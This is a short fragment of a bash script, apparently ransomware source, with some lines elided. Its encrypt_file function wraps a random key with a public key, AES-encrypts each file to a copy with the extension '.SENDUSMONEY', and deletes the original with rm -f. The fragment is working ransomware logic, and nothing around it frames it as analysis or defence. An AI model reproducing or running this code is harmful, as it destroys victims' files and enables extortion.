...
encrypt_file() {
	...
	openssl pkeyutl -encrypt -inkey "$pk" -pubin -in <(echo -n "$sym_key") -out "$file.SENDUSMONEY.key"
	openssl enc -aes-256-cbc -salt -in "$file" -out "$file.SENDUSMONEY" -pass pass:"$sym_key" && rm -f "$file"
